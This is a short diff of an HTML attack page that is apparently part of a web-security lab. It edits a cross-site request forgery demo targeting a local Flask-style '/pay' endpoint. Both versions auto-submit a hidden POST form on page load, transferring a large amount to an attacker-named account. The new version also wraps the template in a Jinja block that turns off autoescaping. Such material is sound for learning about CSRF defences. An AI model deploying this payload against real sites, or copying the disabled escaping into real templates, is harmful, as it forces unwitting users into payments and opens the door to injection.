@@ -1,15 +1,17 @@
 <!DOCTYPE html>
+{% autoescape false %}
 <html>
-  <head>
+    <head>
     <meta charset="utf-8">
-    <title>attack</title>
-  </head>
-  
-  <body onload="document.getElementById('csrf').submit();">
-    <form id="csrf" action="http://127.0.0.1:5000/pay" method="POST">
-      <input type="hidden" name="account" value="attacker"/>
-      <input type="hidden" name="amount" value="114514"/>
-    </form>
-  </body>
-  
+    <title>CSRF</title>
+    </head>
+
+
+    <body onload="document.getElementById('pay').submit();">
+        <form id="pay" action="http://127.0.0.1:5000/pay" method="POST">
+            <input type="hidden" name="user" value="Hacker"/>
+            <input type="hidden" name="amount" value="999999"/>
+        </form>
+    </body>
 </html>
+{% endautoescape %}
